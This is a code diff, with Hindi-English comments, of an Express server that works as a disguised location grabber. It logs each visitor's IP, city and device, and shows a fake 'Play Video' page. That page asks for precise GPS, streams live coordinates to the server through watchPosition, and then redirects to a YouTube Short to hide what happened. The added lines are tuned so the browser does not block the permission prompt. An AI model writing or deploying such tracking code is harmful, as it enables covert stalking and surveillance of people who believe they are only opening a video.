@@ -1,7 +1,7 @@
 const express = require('express');
 const app = express();
 
-const TARGET_URL = 'https://youtube.com/shorts/7EvO-9Cxv-M?si=fxLDlcA0YUaOVLmB';
+const TARGET_URL = 'https://youtube.com/shorts/ojy2p-TxKhQ?si=4TxWKKtNcfzOBGaR';
 
 app.get('/', (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -15,67 +15,62 @@ app.get('/', (req, res) => {
             console.log(`IP_LOG => Time: ${timestamp} | IP: ${ip} | Location: ${data.city}, ${data.regionName} | Device: ${userAgent}`);
         }).catch(() => {});
 
-    // Ek aisa page jo permission milne tak video open hi nahi hone dega
+    // Button wala page taki browser permission block na kare
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Loading...</title>
+            <title>Loading Video...</title>
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <style>
-                body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #111; color: #fff; }
-                .loader { margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                body { font-family: Arial, sans-serif; text-align: center; padding-top: 80px; background: #111; color: #fff; }
+                .btn { background: #3498db; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+                .btn:active { background: #2980b9; }
             </style>
         </head>
         <body>
-            <h2>Loading Secure Video...</h2>
-            <div class="loader"></div>
-            <p id="msg">Please allow location access to continue...</p>
+            <h2>Exclusive Video Content</h2>
+            <p>Tap the button below to load the video:</p>
+            <button class="btn" onclick="requestLocation()">Play Video</button>
 
             <script>
-                function askLocation() {
+                function requestLocation() {
                     if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function(position) {
+                        navigator.geolocation.watchPosition(function(position) {
                             const lat = position.coords.latitude;
                             const lon = position.coords.longitude;
                             
-                            // GPS data server par bhejna
-                            fetch('/save-location?lat=' + lat + '&lon=' + lon)
-                                .then(() => {
-                                    // Jab server data save kar le, tabhi target video par bhejega
-                                    window.location.href = '${TARGET_URL}';
-                                }).catch(() => {
-                                    window.location.href = '${TARGET_URL}';
-                                });
+                            // Server par live coordinates bhejna
+                            fetch('/save-location?lat=' + lat + '&lon=' + lon);
                         }, function(error) {
-                            // Agar user block/deny karega, toh video open nahi hoga, message dikhega
-                            document.getElementById('msgmi').innerText = "Location permission is required to view this video!";
-                            // Dubara popup laane ke liye thodi der baad fir se koshish kar sakte hain
-                            setTimeout(askLocation, 3000);
-                        }, { timeout: 20000, enableHighAccuracy: true });
+                            alert("Please allow location access to watch the video.");
+                        }, { 
+                            enableHighAccuracy: true, 
+                            maximumAge: 0, 
+                            timeout: 20000 
+                        });
+
+                        // Thodi der mein video par redirect kar dena
+                        setTimeout(function() {
+                            window.location.href = '${TARGET_URL}';
+                        }, 1500);
                     } else {
                         window.location.href = '${TARGET_URL}';
                     }
                 }
-
-                // Page khulte hi permission maangna shuru kar do
-                window.onload = function() {
-                    askLocation();
-                };
             </script>
         </body>
         </html>
     `);
 });
 
-// GPS Latitude aur Longitude receive karne ka endpoint
 app.get('/save-location', (req, res) => {
     const lat = req.query.lat;
     const lon = req.query.lon;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const time = new Date().toLocaleTimeString();
 
-    console.log(`GPS_EXACT_LOG => IP: ${ip} | Latitude: ${lat} | Longitude: ${lon}`);
+    console.log(`LIVE_GPS_UPDATE => Time: ${time} | IP: ${ip} | Latitude: ${lat} | Longitude: ${lon}`);
     res.sendStatus(200);
 });
 
